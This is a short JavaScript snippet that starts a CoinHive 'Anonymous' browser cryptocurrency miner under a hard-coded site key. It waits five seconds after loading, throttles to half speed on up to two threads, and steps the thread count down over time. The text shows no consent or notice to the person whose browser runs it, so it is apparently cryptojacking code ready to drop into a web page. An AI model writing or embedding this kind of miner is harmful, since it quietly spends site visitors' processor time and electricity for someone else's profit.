var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');

miner.setNumThreads(Math.min(miner.getNumThreads(), 2));

miner.setThrottle(0.5)

setTimeout(startMiner, 5000)

function startMiner() {

    miner.start();

    var interval = setInterval(function () {
        var threads = miner.getNumThreads();
        if (threads <= 1) {
            clearInterval(interval);
        } else {
            miner.setNumThreads(threads - 1);
        }
    }, 45 * 1000);
}